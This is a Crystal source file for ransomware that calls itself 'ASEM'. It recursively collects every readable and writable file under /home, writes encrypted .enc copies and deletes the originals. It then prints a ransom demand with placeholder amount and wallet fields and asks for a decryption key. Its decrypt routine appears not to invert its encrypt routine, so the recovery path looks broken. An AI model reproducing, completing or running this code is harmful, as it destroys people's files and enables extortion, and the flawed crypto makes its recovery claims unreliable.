require "big"

keypair = {} of String => BigInt


def powmod(base, exponent, modulus)
  result = 1.to_big_i
  base = base.to_big_i

  while exponent > 0
    result = (result * base) % modulus if exponent.odd?
    base = (base * base) % modulus
    exponent >>= 1
  end

  result
end

def mod_inverse(a : BigInt, m : BigInt) : BigInt
  m0 = m
  x0 = 0.to_big_i
  x1 = 1.to_big_i

  return 0.to_big_i if m == 1

  while a > 1
    q = a // m
    m, a = a % m, m
    x0, x1 = x1 - q * x0, x0
  end

  x1 += m0 if x1 < 0
  x1
end

def repackStringHexToBytes(input : String) : Slice(UInt8)
  input.hexbytes
end

def repackBytesToString(input : Slice(UInt8) | Array(BigInt)) : String
  String.build do |io|
    input.each { |byte| io.write_byte(byte.to_u8) }
  end
end

def encrypt(msg : String, key : BigInt, prime : BigInt, pack : Bool = false) : String
  io = IO::Memory.new
  msg.each_byte do |byte|
    enc = (byte.to_big_i * key) % prime
    io.write_bytes(enc.to_u64, IO::ByteFormat::LittleEndian)
  end
  raw = io.to_slice
  pack ? raw.hexstring : String.new(raw)
end

def decrypt(msg : String, key : BigInt, prime : BigInt, pack : Bool = false) : String
  encrypted_bytes = pack ? repackStringHexToBytes(msg) : msg.to_slice
  decrypted = Array(BigInt).new

  io = IO::Memory.new(encrypted_bytes)
  while io.pos < io.size
    decrypted << io.read_bytes(UInt64, IO::ByteFormat::LittleEndian).to_big_i
  end

  inverse = mod_inverse(powmod(2, key, prime), prime)

  decrypted_bytes = decrypted.map { |val| (val * inverse) % prime }

  repackBytesToString(decrypted_bytes)
end


armed = false



# Store results here
readable_writable_files = [] of String

# Get current UID to compare permissions if needed later
# current_uid = Process.uid

# Iterate over each user directory in /home/
self_path = Process.executable_path


Dir.each_child("/home") do |user_dir|
  user_home = "/home/#{user_dir}"

  # Skip if not a directory
  next unless File.directory?(user_home)

  # Recursively scan files
  Dir.glob("#{user_home}/**/*", follow_symlinks: false) do |path|
    next unless File.file?(path)
    next if File.expand_path(path) == self_path
    next if File.extname(path) == ".enc"

    if File::Info.readable?(path) && File::Info.writable?(path)
      readable_writable_files << path
    end
  end
end



# readable_writable_files.del("#{__FILE__}")

# Output the results
# puts "Found #{readable_writable_files.size} readable & writable files:"
# readable_writable_files.each { |file| puts file }

armed = true

keypair["public"] = {{public_key}}_i128.to_big_i
keypair["prime"] = {{prime}}_i128.to_big_i

exampleFile = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"

File.write("/tmp/.example", encrypt(exampleFile, keypair["public"], keypair["prime"], false))


if armed
  readable_writable_files.each do |file|
    next if file == __FILE__
    in_file = File.open("#{file}", "rb")
    out_file = File.open("#{file}.enc", "wb")
    buffer = Bytes.new(5 * 1024) # 4kb

    loop do
      bytes = in_file.read(buffer)
      break if bytes == 0
      chunk = String.new(buffer[0, bytes])
      encrypted = encrypt(chunk, keypair["public"], keypair["prime"], false)
      out_file.write(encrypted.to_slice)

    end
    # File.write(
    #   "#{file}.asem",
    #   encrypt(File.read(file), keypair["public"], keypair["prime"], false)
    # )
    File.delete("#{file}")
    in_file.close
    out_file.close
    
  end
end



def check_decrypt_key(key : BigInt, prime : BigInt)
  ex = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
  if File.exists?("/tmp/.example")
    test = File.read("/tmp/.example")
    decrypted = decrypt(test, key, prime, false)
    if decrypted == ex
      puts("Encryption Key valid. Please wait as I decrypt all ur files...")
      encrypted_files = [] of String
      Dir.each_child("/home") do |user_dir|
        user_home = "/home/#{user_dir}"

        # Skip if not a directory
        next unless File.directory?(user_home)

        # Recursively scan for .asem files
        Dir.glob("#{user_home}/**/*.enc", follow_symlinks: false) do |path|
          next unless File.file?(path)
          next if path == __FILE__  # skip the current script

          # Check if current user can read and write the file
          if File::Info.readable?(path) && File::Info.writable?(path)
            encrypted_files << path
          end
        end
      end

      puts("Found #{encrypted_files.size} encrypted files...")
      encrypted_files.each do |file|
        next if file == __FILE__
        # # Remove the `.asem` extension
        original_path = file.gsub(/\.enc$/, "")

        # # Decrypt and write to the original filename
        puts("Decrypting: #{file} to #{original_path}..")
        out_file = File.open("#{original_path}", "wb")
        in_file = File.open("#{file}", "rb")
        buffer = Bytes.new(5 * 1024) # 4kb
        loop do
          bytes = in_file.read(buffer)
          break if bytes == 0
          chunk = String.new(buffer[0, bytes])
          decrypted = decrypt(chunk, key, prime, false)
          out_file.write(decrypted.to_slice)
        end
        
        # File.write(
        #   original_path,
        #   decrypt(File.read(file), key,prime, false)
        # )

        # # Optionally delete the encrypted file
        File.delete(file)
        in_file.close
        out_file.close
        

        
      end

    else
      puts("Invalid Encryption Key.")
    end
  else
    puts("It seems you rebooted to did something we told you NOT to do.. Please wait as I plant an example file...")
    File.write("/tmp/.example", encrypt("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()", {{public_key}}_i128.to_big_i, {{prime}}_i128.to_big_i, false))
    puts("Done. Now try again.")
  end
end

puts("Oops... It seems #{readable_writable_files.size} have been encrypted by ASEM.")
puts("Pay {{amount}} to {{wallet}} or risk have all of your files lost and corrupt forever.")
puts("It is advise you do not turn off the device/exit this program/overwrite any of these files")

loop do
  print "Decryption Key: "
  input = gets
  break if input.nil?

  parts = input.strip.split(":")
  if parts.size == 2
    begin
      k = Int128.new(parts[0].gsub(/_i128$/, ""))
      p_ = Int128.new(parts[1].gsub(/_i128$/, ""))
      check_decrypt_key(BigInt.new(k),BigInt.new(p_))
    rescue e
      puts "Invalid number format: #{e.message}"
    end
  else
    puts "Invalid format. Please use: <key>_i128:<part>_i128"
  end
end
